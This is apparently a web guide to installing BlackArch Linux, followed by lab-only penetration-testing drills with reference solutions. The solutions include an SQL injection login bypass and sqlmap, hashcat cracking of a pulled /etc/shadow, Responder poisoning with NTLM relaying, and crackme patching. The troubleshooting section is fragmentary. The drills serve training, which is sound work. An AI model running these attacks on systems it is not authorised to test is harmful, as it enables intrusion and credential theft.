■ Philosophy & Architecture

BlackArch is not a fork. It is an unofficial user repository on top of Arch Linux. You can install it on bare metal, VM, or strap it onto an existing Arch system. It follows the Arch Way: simplicity, user-centrality, openness, freedom.

▲ BlackArch

Rolling release. Pacman. ~2800+ tools in repo. Install only what you need. AUR access. Bleeding-edge kernel. Minimal footprint. i3/Fluxbox/Xfce or custom WM.

strap.sh | blackman | pacman -S blackarch-*

▲ Kali Linux

Debian-based. APT. ~600 tools pre-installed. Quarterly releases. Heavier footprint. GNOME default. Predictable, curated, enterprise-friendly.

apt | preinstalled env | stable releases
Rule #0: If you cannot install vanilla Arch from scratch, you are not ready for BlackArch maintenance. Learn Arch first. BlackArch assumes you understand pacman, systemd, mkinitcpio, and partition schemes.

■ Method A: Netinstall ISO (Recommended)

1

Download & Verify

Get netinstall ISO from blackarch.org/downloads. Verify GPG signature and SHA512.

gpg --keyserver hkp://pgp.mit.edu --recv-key 4345771566D761F1
gpg --verify blackarch-linux-netinstall-*.iso.sig
2

Flash USB

sudo dd if=blackarch-linux-netinstall-*.iso of=/dev/sdX bs=4M status=progress && sync

Replace /dev/sdX with your actual device. Do not use /dev/sda1 (partition). Use whole disk.

3

Boot & Login

Boot from USB. Select architecture (x86_64). At login prompt:

login: root
password: blackarch
4

Network Setup

If ethernet: usually auto-DHCP. If WiFi:

ip link set wlan0 up
iwctl station wlan0 scan
iwctl station wlan0 connect "SSID"
5

Launch Installer

blackarch-install

Select: 1 Install from repository using pacman → 1 Quiet → set locale/keymap → hostname → 1 Auto DHCP → select interface.

CRITICAL: Before partitioning, press Ctrl+C to exit installer once, then run: pacman -Sy archlinux-keyring and restart blackarch-install. This prevents chroot passwd failure.
6

Partitioning (UEFI + GPT)

Use cfdisk. Recommended layout:

/dev/sda1 → 512M → EFI System → /boot
/dev/sda2 → 2xRAM → Linux Swap → [swap]
/dev/sda3 → rest → Linux FS → / (ext4/btrfs)

For LUKS encryption: select encrypted root during install. Password required on every boot.

7

Finish & Reboot

Set root password, create user, select timezone, choose mirror. For DE: i3 recommended. Skip VM modules if bare metal. Select tool groups or install all. Reboot:

reboot

■ Method B: Strap onto Existing Arch

The cleanest approach. Install vanilla Arch exactly as you want it, then add BlackArch repos.

# Run as root
curl -O https://blackarch.org/strap.sh
chmod +x strap.sh
sudo ./strap.sh
sudo pacman -Syyu
This adds the BlackArch repository to /etc/pacman.conf and imports the signing key. You now have access to all 2800+ tools via pacman.

■ Method C: Slim ISO (GUI Installer)

For those who prefer a graphical Calamares installer. Download Slim ISO, boot live environment, double-click "Install BlackArch" on desktop. Follow GUI prompts. Same partition rules apply.

Segmented Lab Architecture

■ Troubleshooting Pacman

# OR force overwrite specific file

Invalid or corrupted package (PGP signature)▼
sudo pacman-key --init

Server = https://ftp.harukasan.org/blackarch/$repo/os/$arch
SigLevel = Required DatabaseOptional

sudo pacman -Syyu

# Boot from ISO, arch-chroot into install
sudo mount /dev/sda3 /mnt

■ Btrfs + Snapshots (Rollback Heaven)

# During install, choose btrfs for root
# Create subvolumes
sudo btrfs subvolume create /mnt/@
sudo btrfs subvolume create /mnt/@home
sudo btrfs subvolume create /mnt/@snapshots

# Snapshot before major changes
sudo btrfs subvolume snapshot / /mnt/@snapshots/root_$(date +%Y%m%d)

# Rollback if broken
sudo btrfs subvolume delete /
sudo btrfs subvolume snapshot /mnt/@snapshots/root_YYYYMMDD /mnt/@
# Edit fstab, reboot
Btrfs snapshots are instant and zero-cost. Before every blackarch group install or kernel update, snapshot. If something breaks, rollback in 10 seconds.

■ Training Ground Hands-On

Reading is not skill. These drills are built for legal, isolated lab environments only — your own VMs, retired HackTheBox/TryHackMe boxes, Metasploitable2, DVWA, or OWASP Juice Shop. Never point these techniques at systems you don't own or lack written authorization to test.

Scope discipline: Every drill below assumes an isolated NAT/host-only lab network. If you can't answer "who authorized this scope" in one sentence, you're not ready to run the command.

■ Drill 01 — Silent ReconEasy

Scenario: A target VM (Metasploitable2) sits somewhere on your lab's /24. You have zero prior information — not even an IP.

Objective: Identify the live host, fingerprint the OS, and enumerate every open service without triggering a full noisy SYN flood.

Show hint▼

ARP is your friend on a local segment — it doesn't need routing and rarely gets logged the way a full port scan does. Then layer a slower, service-aware scan on just the host you found.

Show reference solution▼
sudo arp-scan --localnet
nmap -sV -sC -T3 -p- <discovered_ip> -oA drill01

■ Drill 02 — The Hidden DirectoryEasy

Scenario: DVWA is running on your lab host. The login page is the only thing you can see.

Objective: Find a non-linked admin or setup path without brute-forcing the entire filesystem — use a wordlist tuned for the tech stack you fingerprinted first.

Show hint▼

Fingerprint the stack (whatweb or response headers) before you pick a wordlist. A PHP app and a Node app hide files in very different places.

Show reference solution▼
whatweb http://target/
gobuster dir -u http://target/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php

■ Drill 03 — Inject or DieMedium

Scenario: OWASP Juice Shop, SQLi challenge. A login form is your entry point.

Objective: Bypass authentication with a manual payload first — understand why it works — before you let sqlmap automate it.

Show hint▼

The classic ' OR 1=1-- only works if the query isn't parameterized and the comment syntax matches the backend DB. Confirm the DB engine first with an intentional syntax error.

Show reference solution▼
# Manual first — email field:
' OR 1=1--

# Then automate to confirm & extract
sqlmap -u "http://target/rest/user/login" --data='{"email":"a","password":"b"}' --batch --dbs

■ Drill 04 — Crack the VaultMedium

Scenario: You've pulled /etc/shadow from a compromised lab VM via a misconfigured backup script.

Objective: Identify the hash format, then crack at least one account faster than a straight rockyou.txt run — think rule-based mutation, not raw brute force.

Show hint▼

hashcat's -a 0 with the best64.rule ruleset squeezes far more mileage out of rockyou.txt than a raw dictionary pass. Match the -m mode to the hash prefix ($6$ = sha512crypt).

Show reference solution▼
unshadow passwd.txt shadow.txt > combined.txt
hashcat -m 1800 -a 0 combined.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

■ Drill 05 — Ghost in the LANHard

Scenario: Your lab AD domain (a free-tier "GOAD" or homemade lab forest) has zero credentials handed to you. Only network access.

Objective: Go from zero creds to a Kerberoastable service account hash, purely through passive/low-noise enumeration — no password spraying against lockout policy.

Show hint▼

LLMNR/NBT-NS poisoning nets you NTLMv2 hashes passively. If SMB signing is disabled on any host, that hash can be relayed instead of cracked — check with crackmapexec smb --gen-relay-list before you even touch hashcat.

Show reference solution▼
sudo responder -I eth0 -wrfv
# while waiting, passive enum:
crackmapexec smb 10.10.10.0/24 --gen-relay-list relay_targets.txt
# if signing disabled anywhere, relay instead of crack:
ntlmrelayx.py -tf relay_targets.txt -smb2support

■ Drill 06 — Reverse the BinaryHard

Scenario: A crackme binary (any of the classic crackmes.one beginner set, downloaded to your isolated analysis VM) asks for a serial key.

Objective: Find the comparison routine and either patch the jump or derive a valid key — without running the binary on your host OS.

Show hint▼

Static triage first: file + strings often leaks the check logic or even the key in unstripped binaries. Then load in Ghidra, search for the string cross-reference, and walk backward to the compare instruction.

Show reference solution▼
file crackme
strings crackme | grep -i -E "correct|wrong|serial|key"
ghidra # open binary, Window > Defined Strings, xref to the check function
# patch: change JNZ to JZ (or NOP the conditional) in the decompiler view, re-export

■ Hacker Trivia & Field Tricks

💡 Did you know

BlackArch's package count crossed 2800 tools not because the maintainers wrote them — almost all are thin PKGBUILDs wrapping upstream GitHub projects. The real engineering is the packaging pipeline, not the tools themselves.

💡 Did you know

The default root password on official BlackArch live images is blackarch — and it's printed on the login screen for a reason: you're expected to change it, or install to disk, within minutes.

🔧 Trick

nmap --top-ports 20 -T4 before a full -p- scan gives you an instant "is anything even alive" signal in under 2 seconds per host — triage your target list before committing to a slow full scan.

🔧 Trick

tmux + tmuxinator to pre-define your entire engagement layout (recon pane, scan pane, notes pane, shell pane) as one YAML file you launch with a single command on every new box.

🔧 Trick

Alias your own recon: alias qscan='nmap -sV -sC -Pn -oN -' in .zshrc. Small frictions removed a hundred times a week compound into hours saved per month.

💡 Did you know

Kerberoasting doesn't require any elevated privileges — any authenticated domain user can request a service ticket for any SPN-registered account. The attack is entirely in what you do with the ticket offline.
